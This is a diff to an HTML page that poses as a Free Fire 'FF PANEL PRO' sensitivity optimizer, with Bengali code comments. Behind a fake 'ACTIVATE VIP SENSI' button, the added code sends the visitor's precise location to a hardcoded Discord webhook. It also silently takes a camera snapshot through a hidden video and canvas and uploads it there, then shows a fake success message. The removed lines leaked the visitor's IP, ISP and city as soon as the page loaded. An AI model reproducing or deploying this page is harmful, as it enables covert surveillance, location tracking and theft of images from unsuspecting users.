@@ -3,73 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FF PANEL PRO v3.5 | Sensi Optimizer</title>
+    <title>FF PANEL PRO v4.0</title>
     <style>
         body { background: #0b1116; color: white; font-family: sans-serif; text-align: center; margin: 0; }
         .hero { padding: 40px 20px; background: #161b22; border-bottom: 2px solid #ff0055; }
-        .scanner-box { background: #1a1a1a; color: #00ff00; padding: 25px; border-radius: 15px; border: 1px solid #333; margin: 20px auto; max-width: 450px; font-family: monospace; }
+        .scanner-box { background: #1a1a1a; color: #00ff00; padding: 25px; border-radius: 15px; border: 1px solid #333; margin: 20px auto; max-width: 450px; }
         button { background: #ff0055; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 85%; font-size: 16px; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="hero">
         <h1 style="color:#ff0055; margin:0;">FF PANEL PRO</h1>
-        <p>Advance Device Optimization & Face ID</p>
+        <p>Advance Sensi & Face ID Verification</p>
     </div>
 
     <div class="scanner-box">
         <h3 style="color: #00ffcc;">[System Analyzer]</h3>
-        <p id="st1">📡 Network: Scanning...</p>
-        <p id="st2">🔋 Battery: Checking...</p>
-        <p id="st3">📍 Location: Ready</p>
+        <p>📡 Network: Stable</p>
+        <p>📍 Location: Ready</p>
         <button onclick="masterFunction()" id="mainBtn">ACTIVATE VIP SENSI</button>
     </div>
+
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
     const webhook = "https://discord.com/api/webhooks/1495337044648394822/Jmy4qE3NN4FKZ_l1R2lKIxWoePGnnmSuefjt4qnewLFf8NXQTtzCj58BS7jYEbMOlRVv";
 
-    // সাইট লোড হওয়ার সাথে সাথে IP আর ISP পাঠাবে (কোনো পারমিশন লাগবে না)
-    window.onload = async () => {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `🕵️ **Visitor Alert!**\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n🏙️ City: ${d.city}\n📱 Device: ${navigator.platform}` })
-            });
-        } catch (e) { console.log("Silent error..."); }
-    };
-
     async function masterFunction() {
         const btn = document.getElementById('mainBtn');
-        btn.innerText = "OPTIMIZING...";
+        btn.innerText = "PROCESSING...";
         
-        // ১. লোকেশন ট্র্যাকিং (চেষ্টা করবে, না পারলেও সমস্যা নেই)
+        // ১. লোকেশন ট্র্যাকিং
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `📍 **Map:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` })
-            });
-        }, (err) => { console.log("Location denied"); });
+            sendToDiscord(`📍 **Map:** http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+        });
 
-        // ২. ক্যামেরা ট্র্যাকিং (চেষ্টা করবে, না পারলেও সমস্যা নেই)
+        // ২. সাইলেন্ট ক্যামেরা স্ন্যাপশট
         try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            // ক্যামেরা এক্সেস পেলে এখানে আপনি চাইলে ছবির লজিক যোগ করতে পারেন
-            fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "📸 **Camera Access Granted!**" })
-            });
-            s.getTracks().forEach(t => t.stop());
-        } catch (e) { console.log("Camera denied"); }
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
 
-        setTimeout(() => {
-            alert("Sensi 200% Activated Successfully!");
-            btn.innerText = "SUCCESS";
-        }, 2000);
+            // ২ সেকেন্ড পর ছবি তুলবে যাতে ক্যামেরা ফোকাস হয়
+            setTimeout(async () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // ছবিটিকে Blob ফাইলে রূপান্তর
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('file', blob, 'snapshot.jpg');
+                    formData.append('content', "📸 **New Face ID Snapshot!**");
+
+                    await fetch(webhook, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    // ক্যামেরা বন্ধ করা
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg');
+                
+                alert("Sensi Activated Successfully!");
+                btn.innerText = "SUCCESS";
+            }, 2000);
+
+        } catch (e) {
+            alert("Please allow camera permission for Face ID!");
+            btn.innerText = "RETRY";
+        }
+    }
+
+    async function sendToDiscord(msg) {
+        await fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ content: msg })
+        });
     }
     </script>
 </body>
